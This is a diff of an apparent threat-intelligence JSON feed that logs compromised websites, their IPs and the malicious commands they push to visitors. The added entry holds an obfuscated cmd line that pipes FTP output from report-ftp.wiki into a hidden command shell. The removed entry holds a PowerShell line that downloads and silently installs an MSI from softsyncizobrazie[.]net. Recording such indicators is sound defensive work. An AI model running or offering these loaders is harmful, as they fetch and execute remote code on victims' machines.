@@ -1,5 +1,18 @@
 [
   {
+    "UrlDomain": "www.colorcommnetwork.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "141.193.213.11"
+    ],
+    "Related": [],
+    "Payload": "cmd /c set \"spain=ftp\"&set \"italy=report-ftp.wiki\"&set \"greek=| \"&set \"polan=for /f %m in ('dir /b /s %windir%\\System32\\cm?.e??') do %m\"&start \"\" /min cmd /c \"%spain% %italy% %greek%%polan%\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwl1rtlh1hhu0oml900pzxyy",
+    "ScannedAt": "2026-11-17T18:50:11.992000+00:00"
+  },
+  {
     "UrlDomain": "indesigner.co.za",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -4665,24 +4678,5 @@
     ],
     "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
     "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
-  },
-  {
-    "UrlDomain": "mattsphotos.com.au",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "65.21.135.42"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwfcanbl0gd80omlgekvfmd3",
-    "ScannedAt": "2026-11-13T18:58:09.495000+00:00"
   }
 ]
